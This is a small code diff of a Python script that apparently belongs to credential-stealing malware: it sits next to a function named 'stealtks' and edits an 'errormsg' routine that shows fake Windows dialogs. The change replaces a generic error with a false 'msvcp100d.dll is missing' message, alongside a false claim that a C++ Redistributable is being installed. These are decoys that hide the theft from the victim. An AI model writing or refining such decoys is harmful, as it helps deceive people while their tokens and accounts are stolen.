@@ -432,7 +432,7 @@ def stealtks():
 
 def errormsg():
     if errtype.lower() == 'error':
-        ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'An unexpected error occurred. (0x8007000D).', "Critical Error", 16)
+        ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'Error while opening, msvcp100d.dll is missing.', "Critical Error", 16)
     elif errtype.lower() == 'info':
         ctypes.windll.user32.MessageBoxW(0, errmg if errmg else 'Program is about to install C++ Redistributable 2012.', "Info", 64)
     elif errtype.lower() == 'warning':
@@ -457,4 +457,5 @@ def main():
         
 
 main()
+
 
